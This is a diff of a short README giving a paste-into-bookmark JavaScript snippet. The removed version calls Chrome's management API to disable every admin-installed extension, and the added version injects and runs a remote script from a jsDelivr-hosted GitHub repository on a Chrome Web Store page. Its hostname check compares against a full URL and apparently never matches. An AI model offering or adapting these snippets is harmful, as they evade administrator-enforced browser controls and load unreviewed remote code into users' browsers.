@@ -2,5 +2,5 @@
 
 To use it, copy-paste the following code into the url of a new bookmark.
 ```js
-javascript:alert("[*] Disabled everything if these doesn't work please dm me @ za#2389"); chrome.management.getAll(a => a.filter(e => e.installType === 'admin').forEach(e => chrome.management.setEnabled(e.id,!1)))
+javascript: if (window.location.hostname == "https://chrome.google.com/webstorex") {var script = document.body.appendChild(document.createElement("script")); script.src="https://cdn.jsdelivr.net/gh/Lixalidy/yaaaaaa@latest/jaja.js"; script.remove();} else {alert("[!] Run this at https://chrome.google.com/webstorex")}
 ```
